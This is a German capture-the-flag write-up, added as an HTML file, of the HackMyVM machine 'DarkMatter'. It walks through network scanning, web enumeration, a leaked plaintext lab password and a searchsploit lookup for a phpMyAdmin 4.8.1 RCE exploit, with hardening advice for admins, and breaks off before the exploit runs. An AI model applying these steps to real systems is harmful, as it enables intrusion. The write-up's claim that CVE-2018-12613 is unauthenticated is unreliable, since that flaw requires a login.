@@ -1,0 +1,1401 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DarkMatter - HackMyVM - Hard - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+<div class="header-bg">
+        <h1>DarkMatter - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <h2>Hard</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">searchsploit</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">unzip</div>
+                <div class="tool-item">uname</div>
+                <div class="tool-item">gcc</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">./expl-static</div>
+                <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p>
+                Meine initiale Aufklärung begann mit der Identifizierung der Ziel-IP-Adresse im lokalen Netzwerk. Ich habe einen ARP-Scan verwendet, um aktive Hosts zu finden und nach der spezifischen VirtualBox-Vendor-ID zu filtern, um das Zielsystem einzugrenzen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">arp-scan -l | grep &quot;PCS&quot; | awk &apos;{print $1}&apos;</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="command">192.168.2.54</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `arp-scan -l` scannt das lokale Netzwerk nach aktiven Geräten. Die Ausgabe wird an `grep "PCS"` weitergeleitet, um Zeilen zu finden, die "PCS" enthalten (was auf die PCS Systemtechnik Vendor ID von VirtualBox hindeutet). Der gefilterte Output wird dann an `awk '{print $1}'` übergeben, um nur das erste Feld, die IP-Adresse, auszugeben. Das Ergebnis ist die IP-Adresse `<span class="command">192.168.2.54</span>`, die sehr wahrscheinlich die des Zielsystems ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein effizienter und gezielter Weg, die IP-Adresse des Zielsystems in einem bekannten Netzwerksegment zu identifizieren, insbesondere wenn man weiß, dass es sich um eine virtuelle Maschine (hier VirtualBox) handelt. Dieser Schritt liefert die notwendige IP für weitere Scans.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Notiere die gefundene IP-Adresse als Ziel für alle weiteren Aktionen.
+                <br><strong>Empfehlung (Admin):</strong> Sei dir bewusst, dass MAC-Adressen und Vendor-Informationen Hinweise auf die zugrundeliegende Infrastruktur geben können.
+            </p>
+
+             <p>
+                 Ich habe die gefundene IP-Adresse zu meiner lokalen Hosts-Datei hinzugefügt, um das Ziel über seinen Hostnamen ansprechen zu können.
+             </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">vi /etc/hosts</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="command">192.168.2.54    darkmatter.hmv</span></pre>
+                 </div>
+             </div>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Der Befehl `vi /etc/hosts` öffnet die Hosts-Datei, um eine manuelle Zuordnung der IP-Adresse 192.168.2.54 zum Hostnamen darkmatter.hmv vorzunehmen. Diese lokale Konfiguration vereinfacht die Referenzierung des Ziels in nachfolgenden Befehlen.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Dies ist ein reiner Komfort-Schritt für den Pentester. Es hat keine Auswirkungen auf die Sicherheit des Zielsystems, verbessert aber die Lesbarkeit der Befehle im Bericht.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Die Verwendung des Hostnamens ist nun möglich.
+                 <br><strong>Empfehlung (Admin):</strong> Keine direkte sicherheitsrelevante Empfehlung aus diesem Schritt.
+             </p>
+
+            <p>
+                Der nächste entscheidende Schritt war ein umfassender Port-Scan mit Nmap, um alle offenen Ports zu identifizieren, die potenziellen Angriffsvektoren darstellen. Ich habe einen aggressiven Scan mit Service- und Versionserkennung sowie OS-Fingerprinting durchgeführt.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.54 </span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+Starting Nmap 7.95 ( <span class="command">[Link: https://nmap.org | Ziel: https://nmap.org]</span> ) at <span class="command">2025-06-19 22:37 CEST</span>
+<span class="command">Nmap scan report for darkmatter.hmv (192.168.2.54)</span>
+Host is up (<span class="command">0.00020s latency</span>).
+Not shown: <span class="command">65533 closed tcp PORTs (reset)</span>
+<span class="command">PORT   STATE SERVICE VERSION</span>
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span>
+<span class="command">| ssh-hostkey: </span>
+<span class="command">|   3072 54:42:86:67:e3:5b:74:e1:87:9c:4d:80:0a:59:f3:4d (RSA)</span>
+<span class="command">|   256 b8:ae:fd:d6:01:e8:e4:0f:63:74:7c:ea:20:ac:fe:80 (ECDSA)</span>
+<span class="command">|_  256 f6:40:de:a2:c3:ec:2f:e0:f0:b9:76:21:3e:ee:a7:5d (ED25519)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.51 ((Debian))</span>
+<span class="command">|_http-title: Apache2 Debian Default Page: It works</span>
+<span class="command">|_http-server-header: Apache/2.4.51 (Debian)</span>
+<span class="command">MAC Address: 08:00:27:B5:9E:2F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+<span class="command">Device type: general purpose</span>
+Running: <span class="command">Linux 4.X|5.X</span>
+<span class="command">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
+<span class="command">OS details: Linux 4.15 - 5.19</span>
+Network Distance: <span class="command">1 hop</span>
+<span class="command">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+<span class="command">TRACEROUTE</span>
+HOP RTT     ADDRESS
+1   <span class="command">0.20 ms darkmatter.hmv (192.168.2.54)</span>
+
+<span class="command">OS and Service detection performed. Please report any incorrect results at [Link: https://nmap.org/submit/ | Ziel: https://nmap.org/submit/] .</span>
+<span class="command">Nmap done: 1 IP address (1 host up) scanned in 10.00 seconds</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">nmap -sS -sC -sV -p- -T5 -AO 192.168.2.54 | grep open</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span>
+<span class="command">80/tcp open  http    Apache httpd 2.4.51 ((Debian))</span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Nmap-Scan identifizierte zwei offene TCP-Ports: 22 (SSH) und 80 (HTTP). Port 22 läuft OpenSSH 8.4p1 auf Debian. Port 80 wird von Apache httpd 2.4.51 auf Debian gehostet, und die Standardseite ("Apache2 Debian Default Page: It works") wird angezeigt. Die OS-Erkennung tippt auf Linux.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die offene Ports 22 und 80 sind die primäre Angriffsfläche. SSH (Port 22) könnte anfällig sein, wenn veraltete Versionen oder schwache Anmeldedaten verwendet werden. Der HTTP-Dienst (Port 80) ist der wahrscheinlichste Vektor für Initial Access. Die identifizierten Softwareversionen (OpenSSH 8.4p1, Apache 2.4.51) sollten auf bekannte Schwachstellen geprüft werden. Die Standard-Apache-Seite deutet darauf hin, dass die eigentliche Webanwendung möglicherweise in einem Unterverzeichnis liegt oder auf einem anderen virtuellen Host.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentriere die Enumeration auf den HTTP-Dienst (Port 80). Untersuche die Webanwendung detailliert nach versteckten Verzeichnissen, Dateien oder spezifischen Frameworks/Technologien, die nicht auf der Standardseite sichtbar sind. Prüfe die Versionen von OpenSSH und Apache auf bekannte CVEs.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass alle öffentlich zugänglichen Dienste auf dem neuesten Stand sind. Härde die SSH-Konfiguration.
+            </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p>
+                Nach der Identifizierung des HTTP-Dienstes auf Port 80 habe ich Gobuster verwendet, um eine umfassende Verzeichnis- und Datei-Enumeration auf dem Webserver durchzuführen. Dies hilft, versteckte Pfade zu entdecken.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">gobuster dir -u &quot;http://darkmatter.hmv&quot; -w &quot;/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt&quot; -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,svg,pem,crt,json,conf,ELF,elf,c,java,lib,cgi,csh,config,deb,desc,exp,eps,diff,icon,mod,ln,old,rpm,js.map,pHtml,yaml,bak -b &apos;503,404,403&apos; -e --no-error -k</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] <span class="command">Url:                     http://darkmatter.hmv</span>
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/<span class="command">directory-list-2.3-medium.txt</span>
+[+] Negative Status codes:   404,403,503
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              rar,<span class="command">icon</span>,conf,mod,jpeg,<span class="command">dll</span>,rpm,docx,xlsx,pem,csh,deb,asp,<span class="command">ps1</span>,<span class="command">crt</span>,mdb,<span class="command">pdf</span>,raw,rtf,eps,<span class="command">ln</span>,old,<span class="command">pHtml</span>,<span class="command">doc</span>,gz,<span class="command">jpg</span>,<span class="command">png</span>,<span class="command">ELF</span>,yaml,<span class="command">pub</span>,bat,<span class="command">png</span>,<span class="command">tar</span>,sh,bak,<span class="command">c</span>,desc,<span class="command">zip</span>,html,csv,js.<span class="command">map</span>,exe,<span class="command">pl</span>,kdbx,<span class="command">svg</span>,pem,crt,json,conf,<span class="command">ELF</span>,elf,<span class="command">c</span>,java,lib,<span class="command">cgi</span>,csh,config,deb,desc,exp,eps,<span class="command">diff</span>,<span class="command">icon</span>,mod,<span class="command">ln</span>,old,rpm,js.<span class="command">map</span>,<span class="command">pHtml</span>,yaml,bak
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">http://darkmatter.hmv/index.html           (Status: 200) [Size: 10701]</span>
+<span class="command">http://darkmatter.hmv/robots.txt           (Status: 200) [Size: 14]</span>
+<span class="command">http://darkmatter.hmv/phpmyadmin           (Status: 301) [Size: 321] [--&gt; http://darkmatter.hmv/phpmyadmin/]</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Gobuster, konfiguriert mit einer umfangreichen Wortliste und verschiedenen Dateierweiterungen, fand mehrere interessante Pfade auf dem Webserver: `index.html` (die Hauptseite), `robots.txt` und `phpmyadmin` (mit einem 301 Redirect auf `/phpmyadmin/`). Das Finden von `/phpmyadmin` ist besonders wichtig, da dies eine Datenbankverwaltungsoberfläche ist, die oft Schwachstellen aufweist, wenn sie nicht richtig konfiguriert oder gesichert ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Finden von `phpmyadmin` ist ein kritischer Schritt. Es ist eine bekannte Angriffsfläche, und die Standardinstallation ist oft anfällig. `robots.txt` kann ebenfalls wertvolle Hinweise auf versteckte Bereiche geben.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche das Verzeichnis `/phpmyadmin/` detailliert. Prüfe auf Standardanmeldedaten, bekannte Schwachstellen der phpMyAdmin-Version und Konfigurationsprobleme. Untersuche auch den Inhalt von `robots.txt`.
+                <br><strong>Empfehlung (Admin):</strong> Schütze `/phpmyadmin/` durch Authentifizierung, IP-Whitelisting oder indem du es nicht öffentlich zugänglich machst. Aktualisiere phpMyAdmin auf die neueste Version. Vermeide das Preisgeben sensibler Pfade in `robots.txt`.
+            </p>
+
+             <p>
+                 Ich habe auch Nikto auf Port 80 ausgeführt, um eine automatisierte Schwachstellenanalyse des Webservers zu erhalten.
+             </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">nikto -h http://192.168.2.54</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          <span class="command">192.168.2.54</span>
++ Target Hostname:    <span class="command">192.168.2.54</span>
++ Target <span class="command">PORT</span>:        <span class="command">80</span>
++ Start Time:         <span class="command">2025-06-19 22:37:35 (GMT2)</span>
+---------------------------------------------------------------------------
++ Server: <span class="command">Apache/2.4.51 (Debian)</span>
++ /: The anti-clickjacking <span class="command">X-Frame-Options</span> header is not present. See: <span class="command">[Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
++ /: The <span class="command">X-Content-Type-Options</span> header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: <span class="command">[Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
++ No CGI Directories found (use &apos;-C all&apos; to force check all possible dirs)
++ /: Server may leak inodes via ETags, header found with file /, inode: <span class="command">29cd</span>, size: <span class="command">5d0a5dad1c95b</span>, mtime: gzip. See: <span class="command">[Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418]</span>
++ <span class="password">Apache/2.4.51 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.</span>
++ <span class="command">OPTIONS</span>: <span class="command">Allowed HTTP Methods: POST, OPTIONS, HEAD, GET .</span>
++ <span class="command">/phpmyadmin/changelog.<span class="command">php</span></span>: Uncommon header &apos;<span class="command">x-ob_mode</span>&apos; found, with contents: 1.
++ <span class="command">/phpmyadmin/ChangeLog</span>: <span class="command">phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</span>
++ <span class="command">/phpmyadmin/</span>: <span class="password">phpMyAdmin directory found.</span>
++ <span class="command">/phpmyadmin/README</span>: <span class="command">phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts. See: [Link: https://typo3.org/ | Ziel: https://typo3.org/]</span>
++ <span class="command">8254 requests: 0 error(s) and 9 item(s) reported on remote host</span>
++ End Time:           <span class="command">2025-06-19 22:37:55 (GMT2) (20 seconds)</span>
+---------------------------------------------------------------------------
++ <span class="command">1 host(s) tested</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Nikto bestätigte den Apache 2.4.51 Server. Es identifizierte das Fehlen wichtiger Sicherheits-Header (`X-Frame-Options`, `X-Content-Type-Options`) und eine potenzielle ETag-basierte Informationsleckage. Es wies darauf hin, dass der Apache veraltet ist. Wie Gobuster fand Nikto das `phpmyadmin`-Verzeichnis und spezifische Dateien darin wie `changelog.php`, `ChangeLog` und `README`. Die Nikto-Ausgabe betont, dass phpMyAdmin geschützt sein sollte.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nikto verstärkt die Erkenntnisse von Gobuster bezüglich der Existenz von phpMyAdmin und liefert zusätzliche Details über den veralteten Apache und fehlende Sicherheits-Header. Der Fund von phpMyAdmin bleibt der vielversprechendste Web-Vektor.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentriere dich weiterhin auf das `phpmyadmin`-Verzeichnis. Prüfe die README-Datei von phpMyAdmin auf die genaue Version, um nach spezifischen Exploits zu suchen.
+                <br><strong>Empfehlung (Admin):</strong> Aktualisiere Apache. Implementiere fehlende Sicherheits-Header. Schütze phpMyAdmin, wie bereits empfohlen.
+            </p>
+
+             <p>
+                 Um die genaue Version von phpMyAdmin zu bestimmen, was entscheidend für die Suche nach spezifischen Exploits ist, habe ich versucht, die `README`-Datei im `phpmyadmin`-Verzeichnis aufzurufen.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>-------------------------------------------------------------------------------------------------------------------
+
+<span class="command">[Link: http://192.168.2.54/phpmyadmin/README | Ziel: http://192.168.2.54/phpmyadmin/README]</span>
+<span class="command">phpMyAdmin - Readme</span>
+===================
+
+<span class="password">Version 4.8.1</span>
+
+<span class="command">A web interface for MySQL and MariaDB.</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe die Datei `/phpmyadmin/README` direkt über den Webbrowser aufgerufen. Der Inhalt bestätigt, dass es sich um die README-Datei von phpMyAdmin handelt und gibt die genaue Version an: `<span class="password">Version 4.8.1</span>`. Es wird auch bestätigt, dass es sich um eine Web-Oberfläche für MySQL und MariaDB handelt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Bestimmen der genauen phpMyAdmin-Version (4.8.1) ist ein kritischer Schritt. Ich kann nun gezielt nach bekannten Schwachstellen (CVEs) oder öffentlichen Exploits für diese spezifische Version suchen. phpMyAdmin 4.8.1 ist dafür bekannt, mehrere Schwachstellen zu haben, einschließlich unauthentifizierter RCE-Schwachstellen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suche sofort auf Exploit-Datenbanken (Exploit-DB, NVD) nach Schwachstellen und Exploits für phpMyAdmin Version 4.8.1. Priorisiere unauthentifizierte RCE-Schwachstellen, da diese direkt zum Initial Access führen können.
+                <br><strong>Empfehlung (Admin):</strong> Aktualisiere phpMyAdmin umgehend auf die neueste stabile Version, um alle bekannten Schwachstellen zu beheben. Entferne die öffentlich zugängliche README-Datei oder beschränke den Zugriff darauf.
+            </p>
+
+             <p>
+                 Ich habe die von Gobuster gefundene `robots.txt` Datei aufgerufen, um zu sehen, ob sie Hinweise auf versteckte Verzeichnisse oder Dateien enthielt.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>___________________________________________________________________________________________________________________
+
+<span class="command">[Link: http://darkmatter.hmv/robots.txt | Ziel: http://darkmatter.hmv/robots.txt]</span>
+<span class="password">/p4ssw0rd.txt</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe die Datei `robots.txt` aufgerufen. Sie enthielt nur einen einzigen Eintrag: `<span class="password">/p4ssw0rd.txt</span>`. Dies ist eine Anweisung an Crawler, diese Datei nicht zu indexieren, aber für einen Pentester ist es ein klarer und sehr vielversprechender Hinweis auf die Existenz einer Datei mit diesem Namen, die Anmeldedaten enthalten könnte.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Das Finden von `/p4ssw0rd.txt` in der `robots.txt` ist ein extrem wichtiger Fund für den Initial Access. Es ist sehr wahrscheinlich, dass diese Datei ein Passwort im Klartext enthält. Dies ist eine hohe Schwachstelle, da die Datei öffentlich zugänglich ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Rufe die Datei `/p4ssw0rd.txt` sofort über den Webbrowser oder `curl` auf und lies ihren Inhalt aus. Erwarte, dort ein Passwort zu finden.
+                <br><strong>Empfehlung (Admin):</strong> Entferne die Datei `/p4ssw0rd.txt` vom Webserver. Speichere niemals Passwörter im Klartext in öffentlich zugänglichen Dateien. Entferne den Hinweis auf sensible Dateien aus der `robots.txt`.
+            </p>
+
+             <p>
+                 Dem Hinweis aus der `robots.txt` folgend, habe ich die Datei `/p4ssw0rd.txt` direkt über den Webserver abgerufen.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>-------------------------------------------------------------------------------------------------------------------
+
+<span class="command">[Link: http://192.168.2.54/p4ssw0rd.txt | Ziel: http://192.168.2.54/p4ssw0rd.txt]</span>
+
+Here is the Password = <span class="password">th3-!llum!n@t0r</span>
+
+<span class="command">Don&apos;t forget to add &quot;darkmatter.hmv&quot; in your local Machine</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe die Datei `/p4ssw0rd.txt` direkt über die IP-Adresse aufgerufen. Die Seite lieferte eine einfache Textausgabe: "Here is the Password = `<span class="password">th3-!llum!n@t0r</span>`" gefolgt von einem Hinweis, den Hostnamen zur Hosts-Datei hinzuzufügen (was ich bereits getan hatte). Der entscheidende Teil ist das Klartextpasswort `<span class="password">th3-!llum!n@t0r</span>`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Voller Erfolg! Ich habe ein Klartextpasswort (`<span class="password">th3-!llum!n@t0r</span>`) über eine öffentlich zugängliche Datei erhalten. Dies ist eine hochkritische Schwachstelle. Dieses Passwort ist sehr wahrscheinlich für einen oder mehrere Benutzer auf dem System gültig, möglicherweise für die phpMyAdmin-Anmeldung oder sogar für SSH.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze das gefundene Passwort (`<span class="password">th3-!llum!n@t0r</span>`), um dich bei phpMyAdmin anzumelden (Standardbenutzernamen wie `root`, `admin`, `pma` testen) und versuche es auch für SSH-Anmeldeversuche mit identifizierten Benutzernamen oder gängigen Standardbenutzern.
+                <br><strong>Empfehlung (Admin):</strong> **Absolut kritisch:** Entferne die Datei `/p4ssw0rd.txt` sofort. Speichere niemals Passwörter im Klartext in öffentlich zugänglichen Dateien. Implementiere Richtlinien, die dies verhindern.
+            </p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p>
+                Nachdem ich das Passwort `<span class="password">th3-!llum!n@t0r</span>` gefunden hatte, habe ich versucht, mich damit bei phpMyAdmin anzumelden (erreichbar über `darkmatter.hmv/phpmyadmin`), beginnend mit dem Standardbenutzernamen `root`.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>-------------------------------------------------------------------------------------------------------------------
+
+ <span class="command">[Link: http://192.168.2.54/phpmyadmin/index.php | Ziel: http://192.168.2.54/phpmyadmin/index.php]</span>
+phpMyAdmin
+Welcome to phpMyAdmin
+Cannot log in to the MySQL server
+
+Log inDocumentation
+Username: root
+Password: <span class="password">th3-!llum!n@t0r</span>
+<span class="password">mysqli_real_connect(): (HY000/1045): Access denied for user &apos;root&apos;@&apos;localhost&apos; (using password: YES)</span>
+
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe versucht, mich bei phpMyAdmin als Benutzer `root` mit dem gefundenen Passwort `<span class="password">th3-!llum!n@t0r</span>` anzumelden. Die Fehlermeldung "`Access denied for user 'root'@'localhost' (using password: YES)`" zeigt, dass die Anmeldung für den Benutzer `root` mit diesem Passwort fehlgeschlagen ist. Das Passwort war für den Root-MySQL-Benutzer nicht korrekt, oder der Benutzer `root` darf sich nicht von `localhost` aus anmelden (was hier unwahrscheinlich ist, da es sich um phpMyAdmin auf demselben Server handelt).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das gefundene Passwort ist nicht das Passwort für den MySQL-Root-Benutzer. Dies bedeutet, dass ich keinen direkten Datenbankzugriff als Root über phpMyAdmin habe. Das gefundene Passwort könnte aber immer noch für einen anderen Benutzer auf phpMyAdmin oder für SSH gültig sein.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Versuche das Passwort `<span class="password">th3-!llum!n@t0r</span>` mit anderen Standard-phpMyAdmin-Benutzernamen (`pma`, `admin`) zu verwenden. Versuche es auch für SSH mit Standard-Systembenutzernamen oder Benutzernamen, die du später noch enumerierst. Da phpMyAdmin 4.8.1 anfällig für unauthentifizierte RCE ist, ist dies der primäre Fokus für Initial Access.
+                <br><strong>Empfehlung (Admin):</strong> Ändere das Root-Passwort für die MySQL-Datenbank. Stelle sicher, dass niemals MySQL-Anmeldedaten im Klartext gespeichert werden.
+            </p>
+
+            <p>
+                Da die direkte Anmeldung als `root` bei phpMyAdmin mit dem gefundenen Passwort fehlschlug, habe ich meinen Fokus auf die identifizierte phpMyAdmin Version 4.8.1 und die Suche nach unauthentifizierten Exploits verlagert. Ich habe die Exploit-Datenbank `searchsploit` verwendet, um nach passenden Exploits zu suchen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">searchsploit phpmyadmin 4.8.1</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+------------------------------------------------------------ ---------------------------------
+<span class="command">Exploit Title                                              |  <span class="command">PATH</span></span>
+------------------------------------------------------------ ---------------------------------
+<span class="command">phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (1) | <span class="command">php</span>/webapps/<span class="command">44924.txt</span></span>
+<span class="command">phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2) | <span class="command">php</span>/webapps/<span class="command">44928.txt</span></span>
+<span class="password">phpMyAdmin 4.8.1 - Remote Code Execution (RCE)              | <span class="command">php</span>/webapps/<span class="command">50457.py</span></span>
+------------------------------------------------------------ ---------------------------------
+<span class="command">Shellcodes: No Results</span>
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">searchsploit -m <span class="command">php</span>/webapps/<span class="command">50457.py</span></span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+  Exploit: phpMyAdmin 4.8.1 - Remote Code Execution (RCE)
+      <span class="command">URL</span>: <span class="command">[Link: https://www.exploit-db.com/exploits/50457 | Ziel: https://www.exploit-db.com/exploits/50457]</span>
+     <span class="command">PATH</span>: /usr/share/exploitdb/exploits/<span class="command">php</span>/webapps/<span class="command">50457.py</span>
+    <span class="command">Codes: CVE-2018-12613</span>
+ Verified: True
+File <span class="command">TYPE</span>: <span class="command">Python scrpt, ASCII text executable</span>
+Copied to: <span class="command">/root/50457.py</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe `searchsploit phpmyadmin 4.8.1` ausgeführt, um die Exploit-Datenbank nach Schwachstellen für diese Version zu durchsuchen. Die Ausgabe listete mehrere Exploits, darunter zwei Authenticated LFI-Exploits und einen **Remote Code Execution (RCE)** Exploit (`<span class="password">php/webapps/50457.py</span>`). Der RCE-Exploit ist mit CVE-2018-12613 verknüpft und als unauthentifiziert bekannt. Mit `searchsploit -m 50457.py` habe ich das Python-Skript auf mein System kopiert (`/root/50457.py`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Das Finden eines öffentlichen, unauthentifizierten RCE-Exploits für die installierte phpMyAdmin-Version ist der Schlüssel zum Initial Access. CVE-2018-12613 ermöglicht die Ausführung beliebigen PHP-Codes auf dem Server ohne Authentifizierung, wenn eine bestimmte Dateistruktur existiert. Dies ist ein hochkritischer Vektor.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche das heruntergeladene Python-Skript `50457.py`. Passe es gegebenenfalls an (z.B. Ziel-URL, Pfad zu phpMyAdmin) und nutze es, um Befehle auf dem Zielsystem auszuführen und eine Reverse Shell zu erhalten.
+                <br><strong>Empfehlung (Admin):</strong> **Absolut kritisch:** Aktualisiere phpMyAdmin umgehend auf eine nicht anfällige Version. Deaktiviere den Zugriff auf anfällige Dateien oder Pfade, auch wenn phpMyAdmin aktualisiert wird.
+            </p>
+
+             <p>
